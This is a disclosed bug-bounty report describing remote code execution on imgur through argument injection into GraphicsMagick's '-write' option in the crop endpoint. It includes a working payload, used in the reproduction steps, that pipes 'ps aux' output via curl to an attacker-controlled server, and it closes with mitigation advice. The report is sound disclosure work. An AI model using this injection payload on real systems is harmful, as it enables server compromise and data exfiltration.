# RCE by command line argument injection to `gm convert` in `/edit/process?a=crop`

## Report Details
- **Report ID**: 212696
- **URL**: https://hackerone.com/reports/212696
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2017-03-12T03:46:46.948Z
- **Disclosed**: 2017-04-26T21:30:28.855Z

## Reporter
- **Username**: neex
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: imgur

## Vulnerability Information
### Summary

The `y` parameter of `/edit/process` endpoint (with `a=crop`) is vulnerable to command-line argument injection to something that appears to be GraphicsMagick utility (probably `gm convert`). Due to GraphicsMagick's hacker-friendly processing of `|`-starting filenames supplied to `-write` option, it leads to command execution.

### Reproduction steps

0. Enable Burp Proxy or similar software that allows you to log and edit HTTP requests.
1. Login into your imgur account and upload an image.
2. Move your mouse over the image, click on the tiny button with pencil on it, then click "Edit".
3. Select a random rectangle on the image, then click "Apply".
4. In the burp suite, you will see a request to an URL like this:  `http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0&w=700&h=746&random=4011802027746510`

     Change the `y` parameter of the request so it becomes `0 -write |ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-`. 

     The full URL after the change must look like `http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0%20-write%20|ps${IFS}aux|curl${IFS}http://<your-server>{IFS}-d${IFS}@-&w=700&h=830&random=9905392865702303`, note that you have to change `<your-server>` to a webserver under your control).

5. Fire a request to the modified URL. The command (`ps aux|curl http://<your-server> -d @-`) will be executed somewhere inside imgur, and you will get a HTTP request to `<your-server>` with the result of `ps aux` in the POST body.  You can replace `ps aux` with another command (but you have to write `${IFS}` instead of spaces).

### Detailed description

I was searching for CVE-2016-10033-like vulnerabilities on several bugbounty sites when I noticed strange behaviour of the mentioned parameter. The vulnerability exists because the user input (the contents of `y` GET parameter) goes into a shell command. While all special characters (like `|`, `$` and so on) seem to be escaped, the space character is not. This allows the attacker to insert additinal command line arguments. The common reason for such behaviour is `escapeshellcmd` PHP function, but that can also be some kind of custom input filtering/processing.

The rest of the exploitation depends on the program that is executed (we need to find out if it supports any dangerous command-line options). Common sense suggests that the external command launched by "Crop/Resize" function must be some image processing tool. The most popular one is ImageMagick/GraphicsMagick, so I appended ` -rotate 90` to the parameter and it succeded --- I saw lying Trump (I mean, the image was rotated). After more tries I was sure it's GraphicsMagick (probably `gm convert` utility). I read the documentation and found that `-write` argument supports perl-style filenames starting with a pipe --- in this case the rest of the filename must be a command to execute.

### Mitigation

Probably either some kind of custom processing or `escapeshellcmd` function is used to construct the command line. In both cases, replace it with applying `escapeshellarg` to individual arguments. In the second case, you probably want to run `grep -R escapeshellcmd <path to the source code>` to find more vulns :-)


## Attachments
No attachments
